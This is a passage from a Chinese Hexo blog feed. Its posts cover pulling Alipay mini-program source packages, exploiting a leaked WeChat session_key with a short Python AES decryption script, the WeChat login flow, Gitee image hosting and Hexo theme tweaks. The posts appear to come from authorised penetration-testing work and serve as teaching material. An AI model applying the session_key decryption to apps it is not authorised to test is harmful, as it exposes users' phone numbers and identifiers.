</p><p>最终导出来之后效果图如下</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503347.png" alt="img"> </p><p>3、小程序源码使用的是js，而通常会加密、混淆等，如上图的js文件，对于我们分析会有一定的阻碍。</p><p>方法还是有的，只需要对js进行美化即可帮助我们分析，这里推荐一个js美化在线工具：</p><p><a href="https://tool.lu/js/">https://tool.lu/js/</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061504971.png" alt="image.png">  </p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>支付宝下程序源码包获取还是比较简单的。不需要像微信小程序那样解密，反编译之类的。</p><p>tar压缩文件即为小程序的源码包。这个包没有加密，使用adb pull拿出来，直接解压即可。解压后对js格式化下代码，就可以分析了。js代码没有混淆，条理很清晰</p><h1 id="备注-支付宝小程序抓包"><a href="#备注-支付宝小程序抓包" class="headerlink" title="[备注]支付宝小程序抓包"></a>[备注]<strong>支付宝小程序抓包</strong></h1><p>在查找小程序反编译的时候，看到52pojie一篇关于小程序抓包的文章，可以参考下！</p><p><a href="https://www.52pojie.cn/thread-1050690-1-1.html">https://www.52pojie.cn/thread-1050690-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> 支付宝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序sessionkey泄露漏洞利用</title>
      <link href="/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8Fsessionkey%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8Fsessionkey%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="案例介绍"><a href="#案例介绍" class="headerlink" title="案例介绍"></a>案例介绍</h1><p>闲来无事，在测试某小程序的时候，发现存在sessionkey泄露漏洞。具体流程如下：</p><p>1、打开小程序后，点击【用户一键登录】：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061407311.png" alt="image.png"> </p><p>2、burp抓包，发现在请求参数中携带了几个比较敏感的字段，如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061407019.png" alt="image.png"> </p><p>三个敏感参数</p><ul><li>encryptedData</li><li>iv</li><li>session_key</li></ul><p>3、参考上篇文章，微信小程序登录流程。知道session_key的作用之一是将小程序前端从微信服务器获取到的encryptedData 解密出来。</p><h1 id="服务端获取开放数据"><a href="#服务端获取开放数据" class="headerlink" title="服务端获取开放数据"></a>服务端获取开放数据</h1><p>微信会对开放数据做签名和加密处理。开发者后台拿到开放数据后可以对数据进行校验签名和解密，来保证数据不被篡改。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061416344.png" alt="image-20240506141657312"> </p><p>签名校验以及数据加解密涉及用户的会话密钥 session_key。 开发者应该事先通过 <a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/login/wx.login.html">wx.login</a> 登录流程获取会话密钥 session_key 并保存在服务器。为了数据不被篡改，开发者不应该把 session_key 传到小程序客户端等服务器外的环境。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061417692.png" alt="image.png"> </p><h1 id="加密数据解密算法"><a href="#加密数据解密算法" class="headerlink" title="加密数据解密算法"></a>加密数据解密算法</h1><p>接口如果涉及敏感数据（如<a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/user-info/wx.getUserInfo.html">wx.getUserInfo</a>当中的 openId 和 unionId），接口的明文内容将不包含这些敏感数据。开发者如需要获取敏感数据，需要对接口返回的加密数据(encryptedData) 进行对称解密。 解密算法如下：</p><ol><li>对称解密使用的算法为 AES-128-CBC，数据采用PKCS#7填充。</li><li>对称解密的目标密文为 Base64_Decode(encryptedData)。</li><li>对称解密秘钥 aeskey &#x3D; Base64_Decode(session_key), aeskey 是16字节。</li><li>对称解密算法初始向量 为Base64_Decode(iv)，其中iv由数据接口返回。</li></ol><p>微信官方提供了多种编程语言的示例代码（<a href="https://res.wx.qq.com/wxdoc/dist/assets/media/aes-sample.eae1f364.zip">点击下载</a>）。每种语言类型的接口名字均一致。</p><h1 id="Python本地实现"><a href="#Python本地实现" class="headerlink" title="Python本地实现"></a>Python本地实现</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2024-04-26 15:42</span></span><br><span class="line"><span class="comment"># @Author: muhe Jing</span></span><br><span class="line"><span class="comment"># @File: decrypt.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key, i_v</span>):</span><br><span class="line">    data = base64.b64decode(urllib.parse.unquote(data))</span><br><span class="line">    key = base64.b64decode(urllib.parse.unquote(key))</span><br><span class="line">    i_v = base64.b64decode(urllib.parse.unquote(i_v))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="built_in">print</span>(i_v)</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, i_v)</span><br><span class="line">    decrypted = cipher.decrypt(data)</span><br><span class="line">    <span class="built_in">print</span>(decrypted.decode)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encryptedData = <span class="built_in">input</span>(<span class="string">&quot;输入获取到的encryptedData:&quot;</span>)</span><br><span class="line">    session_key = <span class="built_in">input</span>(<span class="string">&quot;输入获取到的session_key:&quot;</span>)</span><br><span class="line">    iv = <span class="built_in">input</span>(<span class="string">&quot;输入获取到的iv:&quot;</span>)</span><br><span class="line">    decrypt(encryptedData, session_key, iv)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061418857.png" alt="img"> </p><p>这块可以看到解密之后，在明文字符串后面有特殊字符 “\0e”</p><p>这主要是因为AES算法填充使用的是PKCS#7，该填充模式的特性如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061423475.png" alt="image-20240506142355445"> </p><p>所以，这块填充个了 14字节的 “\x0e”。。。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 微信小程序 </tag>
            
            <tag> sessionkey泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序授权&amp;登录&amp;sessionkey&amp;unionid介绍</title>
      <link href="/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%88%E6%9D%83-%E7%99%BB%E5%BD%95-sessionkey-unionid%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%88%E6%9D%83-%E7%99%BB%E5%BD%95-sessionkey-unionid%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>微信小程序相比于普通的应用，很大的一个优势在于不需要进行注册和显式登录，大部分问题可以直接一键微信登录解决。<br>但是，在点击 “授权”、”登录” 的过程中，都做了那些事情呢？</p><p>1、<strong>获取用户登录凭证</strong>：小程序首先会调用微信提供的<code>wx.login</code>接口，获取用户的登录凭证（code）。这个code是一个临时的、有时效性的字符串，用于后续的身份验证。</p><p>2、<strong>发送请求到开发者服务器</strong>：小程序将获取到的code发送到开发者自己的服务器。这一步是为了保护用户的隐私和安全，因为用户的微信敏感信息（如openid、session_key等）不会直接暴露给小程序。</p><p>3、<strong>开发者服务器与微信服务器交互</strong>：开发者服务器将code、小程序的AppID和AppSecret（这是开发者在微信公众平台注册小程序时获得的，用于证明开发者身份的密钥）一起发送给微信服务器进行校验。</p><p>4、<strong>微信服务器返回用户信息</strong>：如果校验通过，微信服务器会返回一个openid和一个session_key给开发者服务器。openid是用户在微信中的唯一标识，session_key是本次会话的密钥，用于后续加密用户数据的解密。</p><p>5、<strong>开发者服务器返回用户信息给小程序</strong>：开发者服务器可以将openid返回给小程序。小程序可以根据openid进行用户的唯一标识和业务处理。如果需要获取更多用户信息，如昵称、头像等，小程序还需要用户进行额外的授权操作。</p><p>6、<strong>用户授权操作</strong>：如果用户需要授权小程序获取更多的个人信息，小程序会展示一个授权界面，用户点击“授权”按钮后，小程序就可以获取到用户的基本信息了。</p><p>这些就是在微信小程序中点击“授权”或“登录”的过程中，主要发生的一系列操作。这样的设计既保证了用户信息的安全性，又简化了用户的登录流程，提高了用户体验。</p><p>下面通过四个方面主要说一下具体的细节：</p><ul><li>授权和登录的意义</li><li>sessionkey的作用</li><li>unionid的作用，有哪些获取途径</li><li>在应用中如何保存用户登录态</li></ul><h1 id="授权和登录的意义"><a href="#授权和登录的意义" class="headerlink" title="授权和登录的意义"></a>授权和登录的意义</h1><p>首先，在这块需要明确一下概念，<strong>授权</strong> 和 <strong>登录</strong> 是两个操作。</p><h2 id="1-授权"><a href="#1-授权" class="headerlink" title="1. 授权"></a>1. 授权</h2><p>部分接口需要经过用户授权同意才能调用。把这些接口按使用范围分成多个 <code>scope</code> ，用户选择对 <code>scope</code> 来进行授权，当授权给一个 <code>scope</code> 之后，其对应的所有接口都可以直接使用。</p><p>此类接口调用时：</p><ul><li>如果用户未接受或拒绝过此权限，会弹窗询问用户，用户点击同意后方可调用接口；</li><li>如果用户已授权，可以直接调用接口；</li><li>如果用户已拒绝授权，则不会出现弹窗，而是直接进入接口 fail 回调。</li></ul><p>参考小程序开发文档<a href="https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/authorize.html">开放能力 &#x2F; 用户信息 &#x2F; 授权 (qq.com)</a>中，授权操作是通过**wx.authorize()**接口便可以完成</p><p>提前向用户发起授权请求。调用后会立刻弹窗询问用户是否同意授权小程序使用某项功能或获取用户的某些数据，但不会实际调用对应接口。如果用户之前已经同意授权，则不会出现弹窗，直接返回成功。</p><p>也就是说，授权过程实际上只是在小程序前端获得了操作部分wx 接口的访问许可，这个过程实际上是不会与<strong>开发者服务器</strong>发生任何关系的。</p><p>再来看微信官方提供的scope 列表：</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051925365.png" alt="image-20240505192518306"> </p><p>wx.authorize(Object object)接口示例代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以通过 wx.getSetting 先查询一下用户是否授权了 &quot;scope.record&quot; 这个 scope</span></span><br><span class="line">wx.<span class="title function_">getSetting</span>(&#123;</span><br><span class="line">  <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!res.<span class="property">authSetting</span>[<span class="string">&#x27;scope.record&#x27;</span>]) &#123;</span><br><span class="line">      wx.<span class="title function_">authorize</span>(&#123;</span><br><span class="line">        <span class="attr">scope</span>: <span class="string">&#x27;scope.record&#x27;</span>,</span><br><span class="line">        success () &#123;</span><br><span class="line">          <span class="comment">// 用户已经同意小程序使用录音功能，后续调用 wx.startRecord 接口不会弹窗询问</span></span><br><span class="line">          wx.<span class="title function_">startRecord</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="2-登录"><a href="#2-登录" class="headerlink" title="2. 登录"></a>2. 登录</h2><p>所谓的登录就是要让<strong>开发者服务器</strong>知道当前的用户是谁？在传统的web 应用中，我们必须要让用户输入账号和密码才能实现登录操作。但是在微信应用中，我们可以通过微信服务器来完成这个操作，获取到与当前用户对应的唯一标志（**<u>openId</u>**）。</p><p>微信提供了两种方法  <strong>wx.login 和  wx.getUserProfile</strong> ，<strong>官方是推荐使用第二种因为第二种是必须要通过用户的授权才可以获取信息，而第一种则是直接获取。</strong></p><h3 id="wx-login："><a href="#wx-login：" class="headerlink" title="wx.login："></a>wx.login：</h3><p>wx.login()用来做登录的方法，调用接口获取登录凭证，code发送给后端用于置换session_key和openid等数据。每个用户相对于每个微信应用（公众号或者小程序）的openId 是唯一的，也就是说一个用户相对于不同的微信应用会存在不同的openId。</p><p>小程序可以通过微信官方提供的登录能力方便地获取微信提供的用户身份标识，快速建立小程序内的用户体系。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051925825.png" alt="image-20240505192537783">  </p><p><strong>上图是小程序官方的一张登录流程图，可以简单说一下这个流程</strong></p><p>1、调用 <a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/login/wx.login.html">wx.login()</a> 获取 <strong>临时登录凭证code</strong> ，并回传到开发者服务器。</p><p>2、后端调用微信接口，用appid+appsecret+code发送过去，置换到session_key+openid，以前是不能置换unionid的，但是现在在满足以下条件可以置换到unionid</p><ul><li>微信开放平台下存在同主体的App、公众号、小程序 </li><li>用户关注了某个相同主体公众号，或曾经在某个相同主体App、公众号上进行过微信登录授权 同时满足以上两个条件就能拿到用户unionid，这样一来，就能在wx.login()准确识别出用户是谁</li></ul><p>3、自定义登录态与openid和session_key关联，实际就是生成一个与openid，session_key关联的token，下发给前端</p><p>4、前端将后端下发的token存入缓存，在后面的接口请求中带上自定登录态</p><p>以上就是小程序的整个登录流程，可以看到在特定的条件下，通过wx.login()的调用拿到unionId也能在后端数据库里拿到用户信息。</p><h3 id="wx-getUserInfo-wx-getUserProfile-："><a href="#wx-getUserInfo-wx-getUserProfile-：" class="headerlink" title="wx.getUserInfo()&#x2F;wx.getUserProfile()："></a>wx.getUserInfo()&#x2F;wx.getUserProfile()：</h3><p>功能描述：获取用户信息。页面产生点击事件（例如 <code>button</code> 上 <code>bindtap</code> 的回调中）后才可调用，每次请求都会弹出授权窗口，用户同意后返回 <code>userInfo</code>。<code>wx.getUserProfile</code>该接口用于替换 <code>wx.getUserInfo</code>，详见 <a href="https://developers.weixin.qq.com/community/develop/doc/000cacfa20ce88df04cb468bc52801?highLine=login">用户信息接口调整说明</a>。</p><p>这块以<code>wx.getUserInfo</code>为例，首先看一下这个API：</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051930698.png" alt="image-20240505193046661"> </p><p>在设置withCredentials 属性为true 的情况下，这个api 可以拿到encryptedData，iv 等敏感信息，encryptedData 需要使用session_key 进行解密，解密后可以拿到的数据。</p><p>也就是说，session_key的作用之一是将小程序前端从微信服务器获取到的encryptedData 解密出来，获取到openId 和unionId等信息。</p><p>但是在wx.login()登录过程中可以看到开发者服务器是能够直接拿到用户的openId信息，而且unionId 也是有其他获取途径，所以session_key 在这里的作用看起来有点鸡肋。</p><p>具体session_key有什么作用，可以继续往下看。</p><h1 id="sessionkey的作用"><a href="#sessionkey的作用" class="headerlink" title="sessionkey的作用"></a>sessionkey的作用</h1><p>登录过程中涉及session_key和unionId，于是又引出了下面的问题。</p><p>session_key在登录的过程中或者登录完成后起什么作用呢？</p><p>前面说到在<code>wx.getUserInfo()</code>中可以利用session_key 对encryptedData进行加解密，那具体在什么场景下会涉及呢？？？</p><p>【场景举例】</p><p>在使用微信小程序的时候，登录一般会提供 <strong>微信授权一键登录</strong>，这时候会弹窗，确认手机号，然后进行登录确认：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051937473.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051939889.png" alt="image-20240505193931858"> </p><p>所以，session_key 一个重要的作用大概体现在获取用户手机方面（可能还包含其他敏感信息获取api）。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051942985.png" alt="image-20240505194236945"> </p><p>可以看到getPhoneNumber 返回的用户数据是加密过的，只有使用session_key才能解密，而小程序前端没有session_key，所以无法获取到用户的手机，只能传到开发者服务器进行处理。</p><h1 id="unionId-的作用-获取途径"><a href="#unionId-的作用-获取途径" class="headerlink" title="unionId 的作用&amp;获取途径"></a>unionId 的作用&amp;获取途径</h1><h2 id="1-unionid机制说明"><a href="#1-unionid机制说明" class="headerlink" title="1. unionid机制说明"></a>1. unionid机制说明</h2><p>如果公司拥有多个移动应用、网站应用、和公众帐号（包括小程序），可通过unionid来区分用户的唯一性，因为只要是同一个微信开放平台帐号下的移动应用、网站应用和公众帐号（包括小程序），用户的unionid是唯一的。换句话说，同一用户，对同一个微信开放平台下的不同应用，unionid是相同的。</p><p><strong>Tip</strong>：unionid 用于识别同一主体下不同账号之间的用户。举例说明：就是公司有A订阅号，B服务号，同一个人关注A和B，会得到不同的OPENID，但是会得到相同的unionid。这样就可以识别到相同的用户，用于不同账号之间打通用户关系。</p><h2 id="2-UnionID获取途径"><a href="#2-UnionID获取途径" class="headerlink" title="2. UnionID获取途径"></a>2. <strong>UnionID获取途径</strong></h2><p>必须有一个微信开放平台账号绑定了至少一个微信公众账号或者网站应用或者小程序，否则UnionID返回null。绑定了开发者帐号的小程序，可以通过下面3种途径获取UnionID。</p><p><strong>方法一：</strong>调用接口wx.getUserInfo，从解密数据中获取UnionID。注意本接口需要用户授权，请开发者妥善处理用户拒绝授权后的情况。</p><p><strong>方法二：</strong>如果开发者帐号下存在同主体的公众号，并且该用户已经关注了该公众号。开发者可以直接通过wx.login获取到该用户UnionID，无须用户再次授权。</p><p><strong>方法三：</strong>如果开发者帐号下存在同主体的公众号或移动应用，并且该用户已经授权登录过该公众号或移动应用。开发者也可以直接通过wx.login获取到该用户UnionID，无须用户再次授权。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051944734.png" alt="img"> </p><h1 id="在应用中如何保存登录态"><a href="#在应用中如何保存登录态" class="headerlink" title="在应用中如何保存登录态"></a>在应用中如何保存登录态</h1><p>保存用户登录态，一直以来都有两种解决方案：前端保存和后端保存。</p><h2 id="1-前端保存"><a href="#1-前端保存" class="headerlink" title="1. 前端保存"></a>1. 前端保存</h2><p>在前面登录章节中<strong>自定义登录态</strong>写session 的时候可以直接设定过期时间，定期通知小程序前端重新进行登录（wx.login）。</p><h2 id="2-前端保存"><a href="#2-前端保存" class="headerlink" title="2. 前端保存"></a>2. 前端保存</h2><p>因为session_key 存在时效性问题（毕竟是用来查看敏感信息），而小程序前端可以通过wx.checkSession() 来检查session_key 是否过期。所以可以通过这个来作为保存用户登录态的机制，这也是小程序文档中推荐的方法：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051947710.png" alt="image-20240505194743677"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> sessionkey </tag>
            
            <tag> unionid </tag>
            
            <tag> 小程序登录&amp;授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitee搭建免费图床</title>
      <link href="/2024/04/17/Gitee%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"/>
      <url>/2024/04/17/Gitee%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么要搭建图床？？？</p><ol><li>hexo默认可以加载本地文件夹和外部URL的图片，搭建图床后主要用来存储图片，方便管理；</li><li>可以将md文件+对应路径图片打包，方便管理；</li><li>可移植性强。</li></ol><p>还有一个原因，这玩意免费啊！！！</p><p>​Typora+PicGo+Gitee实现图片上传功能<br>​抓紧时间步入正题，Go！</p><h1 id="第一步-配置Gitee仓库"><a href="#第一步-配置Gitee仓库" class="headerlink" title="第一步 配置Gitee仓库"></a>第一步 配置Gitee仓库</h1><p>1、附上<a href="https://gitee.com/">码云gitee</a>地址</p><p>2、注册登录自己的gitee账号</p><p>3、创建仓库，仓库要求公开，so要上传合法图片哒~</p><ul><li>步骤一：创建仓库</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170937885.png" alt="image-20240417093654778"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170941548.png" alt="image-20240417094102500"> </p><ul><li>步骤二：生成私人令牌（请在备忘录中记下生成的私人令牌 ）</li></ul><p>打开“个人主页”—&gt;“个人设置”—-&gt;“私人令牌”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170942484.png" alt="image-20240417094222456"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170943977.png" alt="image-20240417094311937"> </p><p>点击 “生成新的令牌” ，提交后，将生成的私人令牌保存好，后面会用到。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170946003.png" alt="image-20240417094637966">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170947800.png" alt="image-20240417094732760"> </p><h1 id="第二步-PicGo的下载及相关配置"><a href="#第二步-PicGo的下载及相关配置" class="headerlink" title="第二步 PicGo的下载及相关配置"></a>第二步 PicGo的下载及相关配置</h1><p>下载地址：<a href="https://github.com/Molunerfinn/PicGo/releases">https://github.com/Molunerfinn/PicGo/releases</a></p><p><strong>1、首先，下载PicGo的安装包</strong></p><p><a href="https://picgo.github.io/PicGo-Doc/zh/guide/#%E5%BA%94%E7%94%A8%E6%A6%82%E8%BF%B0">PicGo官网指南</a><br>一个图床，一个用于快速上传图片并获取图片URL链接的工具，也完全免费。</p><p><strong>2、其次，在PicGo中安装插件</strong></p><p>常见问题：</p><p>\1. 安装插件一直显示“安装中”；</p><p>\2. 使用npm命令安装插件提示： npm不是内部或外部命令，也不是可运行的程序</p><p>解决：Node.js安装及环境配置，这个必须配置的！！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171006115.png" alt="image-20240417100629083"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171020809.png" alt="image-20240417102035779"> </p><p><strong>4、最后，完成PicGo的相关配置</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171024030.png" alt="image-20240417102414003"> </p><p>提示“设置成功”即可，配置好后进行<strong>重启！！！！！！</strong><br>随后，设置PicGo时，先选择显示的图床为gitee，再上翻进行设置Server</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171050897.png" alt="image-20240417105056869"> </p><p>设置成功后在“上传区”测试图片是否能够成功上传，多试几张图片或者重启PicGo看看</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171051216.png" alt="image-20240417105117184"> </p><h1 id="第三步-Typora的下载及相关配置"><a href="#第三步-Typora的下载及相关配置" class="headerlink" title="第三步 Typora的下载及相关配置"></a>第三步 Typora的下载及相关配置</h1><p>typora是一款支持实时预览的Markdown文本编辑器， 并且完全免费<br>下载地址： <a href="https://www.typora.io/">typora</a></p><p>文件—&gt;偏好设置–&gt;配置PicGo路径</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171052201.png" alt="image-20240417105231175"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171053000.png" alt="image-20240417105306966"> </p><p>上传图片之后，图片地址指向码云仓库并且提示上传成功就可了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这样，就可以实现，当使用Typora写文档的时候，无论上传本地&amp;远程的图片，复制过来后，会自动通过PicGo上传到gitee中。</p><p>Typora——&gt;PicGo——&gt;Gitee</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171057563.png" alt="image-20240417105744532"> </p><p>同理，可以看到hexo中的图片加载默认就是从gitee中获取了！！！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171100384.png" alt="image-20240417110017307"> </p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> 博客美化 </tag>
            
            <tag> Gitee </tag>
            
            <tag> Picgo </tag>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo主题美化(续)</title>
      <link href="/2024/04/11/hexo%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96-%E7%BB%AD/"/>
      <url>/2024/04/11/hexo%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96-%E7%BB%AD/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="hexo弹出欢迎弹窗"><a href="#hexo弹出欢迎弹窗" class="headerlink" title="hexo弹出欢迎弹窗"></a>hexo弹出欢迎弹窗</h1><h2 id="选择一个好看的弹窗"><a href="#选择一个好看的弹窗" class="headerlink" title="选择一个好看的弹窗"></a>选择一个好看的弹窗</h2><p>首先，既然要弹窗，就要好看，而不是JavaScript里的alert()函数。</p><p>这块参考网上文章后，选定使用sweetAlert来实现弹窗（<a href="https://sweetalert.js.org/">SweetAlert</a>），感觉不错。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111531919.png" alt="img"></p><h3 id="获取其JavaScript和CSS文件"><a href="#获取其JavaScript和CSS文件" class="headerlink" title="获取其JavaScript和CSS文件"></a>获取其JavaScript和CSS文件</h3><p>首先，需要将sweetalert.js和sweetalert.css放到自己博客下。</p><h3 id="新建JavaScript文件夹"><a href="#新建JavaScript文件夹" class="headerlink" title="新建JavaScript文件夹"></a>新建JavaScript文件夹</h3><p>在博客根目录往下找到\themes\next\source\js文件夹，新建sweetalert.js，文件内容<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.pai233.top/js/sweetalert.js&source=article&objectId=1933199">请看这里</a>，觉得复制麻烦的可以直接按Crtl+S进行保存。</p><h3 id="新建CSS文件"><a href="#新建CSS文件" class="headerlink" title="新建CSS文件"></a>新建CSS文件</h3><p>在博客根目录往下找到\themes\next\source\css文件夹，新建sweetalert.css，文件内容<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.pai233.top/css/sweetalert.css&source=article&objectId=1933199">请看这里</a>。</p><h2 id="引入到主题中"><a href="#引入到主题中" class="headerlink" title="引入到主题中"></a>引入到主题中</h2><p>打开\themes\next\layout_layout.swig，在<head>标签内插入以下语句：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/sweetalert.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/sweetalert.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这样就完成了引入。</p><h2 id="自动弹窗"><a href="#自动弹窗" class="headerlink" title="自动弹窗"></a>自动弹窗</h2><p>在博客根目录往下找到\themes\next\source\js文件夹，新建welcome.js：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">welcome_text</span> <span class="operator">=</span> <span class="string">&#x27;欢迎光顾xxx的小窝~&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(document.referrer!==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        let referrer=document.referrer.split(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>];</span><br><span class="line">        welcome_text=<span class="string">&quot;欢迎你，来自&quot;</span>+referrer.toUpperCase()+<span class="string">&quot;的用户！&quot;</span>;<span class="comment">//获取用户来源域名</span></span><br><span class="line">    &#125;</span><br><span class="line">    swal(&#123;</span><br><span class="line">        title: <span class="string">&quot; 欢迎！&quot;</span>,</span><br><span class="line">        text: welcome_text+<span class="string">&#x27;\n打开页面下方音乐以获得更佳体验！&#x27;</span>,<span class="comment">//欢迎文本，可自行修改</span></span><br><span class="line">        imageUrl: <span class="string">&quot;/images/avatar.jpg&quot;</span>,<span class="comment">//图片，自行修改位置</span></span><br><span class="line">        timer: <span class="number">3000</span>,<span class="comment">//弹出时间</span></span><br><span class="line">        showConfirmButton: <span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">$(document).ready(()=&gt;&#123;<span class="comment">//若未引用JQuery，请引用</span></span><br><span class="line">    welcome()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样就大功告成了~~~</p><h1 id="双栏布局"><a href="#双栏布局" class="headerlink" title="双栏布局"></a>双栏布局</h1><p>默认情况，博客文章是单栏布局的，如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532739.png" alt="img"> </p><p>但是我们可以通过插件 “hexo-butterfly-article-double-row” 将其调整为双栏布局，如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111533993.png" alt="image.png"> </p><p>首先执行以下的命令</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm i 